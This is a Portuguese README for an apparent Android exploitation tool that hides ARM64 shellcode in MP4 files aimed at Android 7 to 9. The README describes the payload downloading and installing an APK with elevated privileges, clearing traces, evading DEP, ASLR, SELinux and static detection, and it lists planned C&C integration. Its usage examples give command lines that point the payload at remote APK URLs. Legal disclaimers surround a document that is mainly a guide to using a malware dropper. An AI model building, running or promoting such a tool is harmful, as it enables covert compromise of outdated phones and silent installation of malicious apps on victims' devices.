# Ferramenta de Exploração Android - MP4 Malicioso

Uma ferramenta CLI em Python para gerar arquivos MP4 maliciosos com payload injetado, destinada à exploração de vulnerabilidades em dispositivos Android desatualizados (versões 7.0 a 9.0).

## ⚠️ Disclaimer Legal

Esta ferramenta é fornecida **exclusivamente para fins educacionais, de pesquisa em segurança e testes autorizados**. O uso para fins maliciosos é **ilegal** e **antiético**. 

- Usar apenas em ambientes controlados
- Testar apenas em dispositivos de sua propriedade ou com autorização explícita
- Cumprir todas as leis aplicáveis em sua jurisdição
- O autor não é responsável por uso indevido

## 📋 Características

- **Geração de Shellcode ARM64**: Cria código nativo para exploração
- **Injeção em MP4**: Embutir payload em arquivos de mídia
- **Suporte a Múltiplas Versões**: Android 7.0, 8.0, 8.1, 9.0
- **Múltiplos Métodos**: Use-After-Free (UAF), ROP, Híbrido
- **Ofuscação**: Evasão de detecção estática
- **Interface CLI**: Modo interativo e linha de comando
- **Validação MP4**: Preserva integridade do arquivo

## 🚀 Quick Start

### Instalação

```bash
# Clonar repositório
git clone <repo-url>
cd android-exploit-tooling

# Instalar dependências
pip install -r requirements.txt
```

### Uso Básico

```bash
# Modo interativo (recomendado)
python main.py --interactive

# Modo linha de comando
python main.py \
  --mp4 video.mp4 \
  --url http://192.168.1.100:8080/payload.apk \
  --android 9 \
  --obfuscate
```

## 📁 Estrutura do Projeto

```
android-exploit-tooling/
├── main.py                    # Ponto de entrada
├── cli_interface.py           # Interface CLI
├── payload_generator.py       # Gerador de shellcode ARM64
├── mp4_injector.py            # Injetor de MP4
├── config.json                # Configuração padrão
├── requirements.txt           # Dependências
├── README.md                  # Este arquivo
├── USAGE.md                   # Guia de uso detalhado
├── TECHNICAL.md               # Documentação técnica
├── ARCHITECTURE.md            # Arquitetura do projeto
└── output/                    # Arquivos gerados
```

## 🔧 Componentes Principais

### 1. PayloadGenerator (payload_generator.py)

Gera shellcode ARM64 que:
- Abre conexão socket para servidor
- Baixa arquivo APK
- Instala com permissões elevadas
- Limpa rastros

**Suporta:**
- Diferentes versões de Android
- Múltiplos métodos de exploração
- Ofuscação de código
- NOP sleds para tolerância

### 2. MP4Injector (mp4_injector.py)

Manipula arquivos MP4 para:
- Parse de estrutura de atoms
- Localizar ponto de injeção
- Embutir payload de forma furtiva
- Preservar validade do arquivo
- Ofuscar estrutura

**Estratégias:**
- Injetar em atom 'free' existente
- Criar novo atom 'free' após metadados
- Manter arquivo playável

### 3. ExploitCLI (cli_interface.py)

Interface de linha de comando com:
- Modo interativo
- Modo batch
- Modo dry-run
- Logging detalhado
- Validação de entrada

## 📖 Exemplos de Uso

### Exemplo 1: Exploração Básica

```bash
python main.py \
  --mp4 video.mp4 \
  --url http://192.168.1.100:8080/payload.apk \
  --android 9
```

### Exemplo 2: Apenas Gerar Payload

```bash
python main.py \
  --generate-payload \
  --url http://server.com/payload.apk \
  --android 9 \
  --obfuscate
```

### Exemplo 3: Versão Android 7.0 com ROP

```bash
python main.py \
  --mp4 video.mp4 \
  --url http://server.com/apk \
  --android 7 \
  --method rop \
  --obfuscate
```

### Exemplo 4: Modo Interativo

```bash
python main.py --interactive
```

Será solicitado:
- Caminho do MP4
- URL do servidor
- Versão do Android
- Método de exploração
- Arquivo de saída

## 🔍 Técnicas Implementadas

### Shellcode ARM64

- Syscalls nativas do ARM64
- Socket connection
- HTTP GET request
- File I/O
- Execução de comandos

### ROP Chain

- Gadgets de libc
- Bypass de DEP/ASLR
- Execução de system()
- Cadeia de retornos

### Ofuscação

- XOR com chave aleatória
- Instruções dummy
- Reordenação de código
- NOP sleds

### MP4 Injection

- Parse de atoms
- Injeção furtiva
- Preservação de validade
- Ofuscação de estrutura

## 🛡️ Proteções Contornadas

- **DEP** (Data Execution Prevention): Via ROP chain
- **ASLR** (Address Space Layout Randomization): Offsets relativos
- **SELinux**: Execução como mediaserver
- **Detecção Estática**: Ofuscação de shellcode

## 📊 Especificações Técnicas

| Aspecto | Valor |
|--------|-------|
| Linguagem | Python 3.8+ |
| Arquitetura | ARM64 |
| Versões Android | 7.0, 8.0, 8.1, 9.0 |
| Tamanho do Payload | ~1-2 KB |
| Tempo de Execução | <1 segundo |
| Métodos | UAF, ROP, Híbrido |

## 📚 Documentação

- **[USAGE.md](USAGE.md)**: Guia completo de uso
- **[TECHNICAL.md](TECHNICAL.md)**: Documentação técnica detalhada
- **[ARCHITECTURE.md](ARCHITECTURE.md)**: Arquitetura do projeto

## 🔧 Dependências

```
pycryptodome>=3.15.0    # Criptografia
click>=8.1.0            # CLI
colorama>=0.4.5         # Cores no terminal
Pillow>=9.0.0           # Processamento de imagens
loguru>=0.6.0           # Logging
```

Instalar com:
```bash
pip install -r requirements.txt
```

## 🚦 Status do Projeto

- [x] Gerador de shellcode ARM64
- [x] Injetor de MP4
- [x] Interface CLI
- [x] Ofuscação básica
- [x] Suporte a múltiplas versões Android
- [ ] Interface GUI (PyQt5)
- [ ] Suporte a ARM32
- [ ] Android 10+
- [ ] Ofuscação avançada
- [ ] C&C integration

## 📝 Changelog

### v1.0.0 (Inicial)
- Geração de shellcode ARM64
- Injeção em MP4
- Interface CLI
- Suporte a Android 7-9
- Ofuscação básica

## 🤝 Contribuições

Contribuições são bem-vindas! Por favor:

1. Fork o projeto
2. Crie uma branch para sua feature
3. Commit suas mudanças
4. Push para a branch
5. Abra um Pull Request

## 📞 Suporte

Para problemas ou dúvidas:

1. Verificar logs em `logs/`
2. Usar `--verbose` para debug
3. Consultar documentação em `TECHNICAL.md`
4. Revisar exemplos em `USAGE.md`

## 📄 Licença

Este projeto é fornecido "como está" para fins educacionais. Consulte a licença para mais detalhes.

## ⚖️ Responsabilidade Legal

O uso desta ferramenta é responsabilidade exclusiva do usuário. O autor não é responsável por:

- Danos causados pelo uso indevido
- Violação de leis locais ou internacionais
- Acesso não autorizado a sistemas
- Qualquer atividade ilegal

## 🎓 Fins Educacionais

Esta ferramenta foi desenvolvida para:

- Pesquisa em segurança de Android
- Educação em exploração de vulnerabilidades
- Testes de segurança autorizados
- Análise de malware
- Desenvolvimento de defesas

## 🔐 Boas Práticas de Segurança

Ao usar esta ferramenta:

1. ✅ Obtenha autorização explícita
2. ✅ Teste em ambiente isolado
3. ✅ Use dispositivos de teste
4. ✅ Documente seus testes
5. ✅ Cumpra leis aplicáveis
6. ✅ Não distribua payloads
7. ✅ Divulgue responsavelmente

## 🌐 Recursos Adicionais

- [Android Security Documentation](https://source.android.com/security)
- [ARM64 ISA Reference](https://developer.arm.com/documentation/ddi0487/)
- [MP4 Specification](https://en.wikipedia.org/wiki/MPEG-4_Part_14)
- [ROP Gadgets](https://ropgadget.com/)

---

**Desenvolvido para fins educacionais e de pesquisa em segurança.**

**Use responsavelmente. Obtenha autorização. Cumpra a lei.**
